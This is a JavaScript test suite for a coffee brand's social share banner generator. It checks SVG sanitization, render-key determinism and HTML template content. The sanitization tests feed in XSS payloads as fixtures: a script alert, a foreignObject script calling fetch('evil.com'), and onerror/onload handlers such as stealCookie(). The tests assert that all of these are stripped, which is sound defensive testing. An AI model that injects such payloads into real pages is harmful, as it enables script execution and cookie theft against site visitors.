/**
 * tools/__tests__/generate_innokafe_social_share_card.test.js
 * =============================================================================
 * Regression test suite for InnoKafe Social Share Banner Generator.
 * Verifies:
 * 1. Double Defense-in-Depth SVG Sanitization (CWE-20/XSS prevention).
 * 2. RadixAttention Content-Addressed Render Key Determinism.
 * 3. Offline / Stealth HTML Template Font & Image Embedding Invariants.
 * =============================================================================
 */

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');

const {
  sanitizeAndEncodeSvg,
  computeRenderKey,
  buildHtmlContent,
  TEMPLATE_VERSION
} = require('../generate_innokafe_social_share_card.js');

describe('InnoKafe Social Share Banner Security & Determinism Suite', () => {

  describe('1. SVG Sanitization & Encoding (CWE-20 / XSS Elimination)', () => {
    it('should strip malicious <script> tags and encode to Data URL', () => {
      const maliciousSvg = '<svg viewBox="0 0 100 100"><script>alert("pwned")</script><circle cx="50" cy="50" r="40"/></svg>';
      const dataUrl = sanitizeAndEncodeSvg(maliciousSvg);

      assert.ok(dataUrl.startsWith('data:image/svg+xml;base64,'), 'Must return a base64 data URL');

      const base64Part = dataUrl.replace('data:image/svg+xml;base64,', '');
      const decoded = Buffer.from(base64Part, 'base64').toString('utf-8');

      assert.ok(!decoded.includes('<script>'), 'Must not contain opening script tag');
      assert.ok(!decoded.includes('alert("pwned")'), 'Must not contain script payload');
      assert.ok(decoded.includes('<circle'), 'Must preserve safe SVG elements');
    });

    it('should strip <foreignObject> tags preventing HTML context escapes', () => {
      const foreignObjectSvg = '<svg><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>fetch("evil.com")</script></body></foreignObject><rect/></svg>';
      const dataUrl = sanitizeAndEncodeSvg(foreignObjectSvg);
      const decoded = Buffer.from(dataUrl.replace('data:image/svg+xml;base64,', ''), 'base64').toString('utf-8');

      assert.ok(!decoded.includes('<foreignObject'), 'Must strip <foreignObject>');
      assert.ok(!decoded.includes('evil.com'), 'Must strip nested payload');
      assert.ok(decoded.includes('<rect/>'), 'Must preserve valid SVG shapes');
    });

    it('should strip inline event handlers (onload, onerror, onclick)', () => {
      const eventSvg = '<svg><image href="x" onerror="stealCookie()" onload=doEvil() onclick=\'alert(1)\'/></svg>';
      const dataUrl = sanitizeAndEncodeSvg(eventSvg);
      const decoded = Buffer.from(dataUrl.replace('data:image/svg+xml;base64,', ''), 'base64').toString('utf-8');

      assert.ok(!decoded.includes('onerror'), 'Must strip onerror');
      assert.ok(!decoded.includes('onload'), 'Must strip onload');
      assert.ok(!decoded.includes('onclick'), 'Must strip onclick');
      assert.ok(!decoded.includes('stealCookie()'), 'Must strip handler body');
    });
  });

  describe('2. RadixAttention Content-Addressed Render Key Determinism', () => {
    it('should compute deterministic 16-character hexadecimal render key', () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'radix-test-'));
      const dummyBg = path.join(tmpDir, 'bg.jpg');
      const dummySvg = path.join(tmpDir, 'logo.svg');

      fs.writeFileSync(dummyBg, 'dummy-background-payload-123');
      fs.writeFileSync(dummySvg, '<svg><circle/></svg>');

      try {
        const key1 = computeRenderKey(dummyBg, dummySvg, 'v1.0');
        const key2 = computeRenderKey(dummyBg, dummySvg, 'v1.0');

        assert.equal(typeof key1, 'string');
        assert.equal(key1.length, 16);
        assert.equal(key1, key2, 'Render key must be strictly deterministic across calls');

        // Modifying background payload alters key
        fs.writeFileSync(dummyBg, 'dummy-background-payload-MODIFIED');
        const key3 = computeRenderKey(dummyBg, dummySvg, 'v1.0');
        assert.notEqual(key1, key3, 'Modified background image must invalidate key');

        // Modifying template version alters key
        const key4 = computeRenderKey(dummyBg, dummySvg, 'v1.1');
        assert.notEqual(key3, key4, 'Template version bump must invalidate key');
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });
  });

  describe('3. HTML Content Template Generation & Invariants', () => {
    it('should build HTML with correct dimensions, <img> logo embedding, and offline fallbacks', () => {
      const mockBgDataUrl = 'data:image/jpeg;base64,mockbg';
      const mockLogoDataUrl = 'data:image/svg+xml;base64,mocklogo';

      const html = buildHtmlContent({
        fontImportRule: '',
        embeddedFontCss: '/* mock font css */',
        bgDataUrl: mockBgDataUrl,
        logoDataUrl: mockLogoDataUrl
      });

      assert.ok(html.includes('width: 1200px;'), 'Must specify 1200px width');
      assert.ok(html.includes('height: 630px;'), 'Must specify 630px height');
      assert.ok(html.includes(`<img src="${mockLogoDataUrl}"`), 'Logo must be rendered via <img> tag to avoid script execution');
      assert.ok(html.includes(`url('${mockBgDataUrl}')`), 'Background image must be embedded via CSS data URL');
      assert.ok(html.includes('alt="InnoKafe Logo"'), 'Must contain InnoKafe logo alt attribute');
      assert.ok(html.includes('innokafe.<span>com</span>'), 'Must contain innokafe.com domain tag');
      assert.ok(html.includes('SCA 84+'), 'Must contain SCA 84+ cupping metric');
      assert.ok(html.includes('1.650m'), 'Must contain elevation terroir metric');
      assert.ok(html.includes('4 KHÔNG'), 'Must contain 4 KHÔNG purity pledge');
      assert.ok(html.includes('HOT-AIR'), 'Must contain Hot-Air convective roasting pill');
    });
  });
});
